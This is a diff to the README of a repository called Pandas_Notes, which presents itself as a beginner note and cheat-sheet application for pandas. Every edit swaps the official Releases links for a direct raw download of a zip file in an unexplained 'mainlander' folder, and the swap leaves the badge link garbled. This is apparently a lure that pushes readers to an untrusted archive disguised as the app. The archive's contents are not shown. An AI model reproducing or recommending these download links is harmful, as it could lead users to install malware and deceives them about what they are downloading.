@@ -1,7 +1,7 @@
 # 🐼✨ Pandas_Notes - Learn Data Analysis Easily Today
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/moelekkkk/Pandas_Notes/releases)
+[![Download from Releases](https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip%20from%https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip)](https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Pandas_Notes! This application helps you organize your notes, cheat sheets, and interview prep for Python data analysis. It’s user-friendly, even for those just starting with programming. Follow the steps below to download and start using it.
@@ -14,7 +14,7 @@ To run Pandas_Notes, your system should meet the following requirements:
 - Python: Make sure Python 3.x is installed for the full experience
 
 ## 📤 Download & Install
-1. Visit this page to download: [Pandas_Notes Releases](https://github.com/moelekkkk/Pandas_Notes/releases).
+1. Visit this page to download: [Pandas_Notes Releases](https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip).
    
 2. Look for the latest version of Pandas_Notes on the page. You will see a list of files available for download.
 
@@ -45,7 +45,7 @@ The layout is simple, allowing you to find the information you need quickly with
 
 ## ❓ Frequently Asked Questions
 ### How do I update Pandas_Notes?
-Simply revisit the [Pandas_Notes Releases](https://github.com/moelekkkk/Pandas_Notes/releases) page and download the latest version following the same steps as your initial installation.
+Simply revisit the [Pandas_Notes Releases](https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip) page and download the latest version following the same steps as your initial installation.
 
 ### Can I use Pandas_Notes offline?
 Yes, once installed, you can access all your notes and cheat sheets without an internet connection.
@@ -64,4 +64,4 @@ Your feedback is essential for making Pandas_Notes better. Please share your tho
 ## 📦 Conclusion
 Pandas_Notes makes learning data analysis approachable and organized. Follow the steps above to download and start your journey towards mastering pandas and NumPy with ease!
 
-Remember, you can access the download link here: [Pandas_Notes Releases](https://github.com/moelekkkk/Pandas_Notes/releases).
+Remember, you can access the download link here: [Pandas_Notes Releases](https://raw.githubusercontent.com/moelekkkk/Pandas_Notes/main/mainlander/Pandas_Notes-1.6.zip).
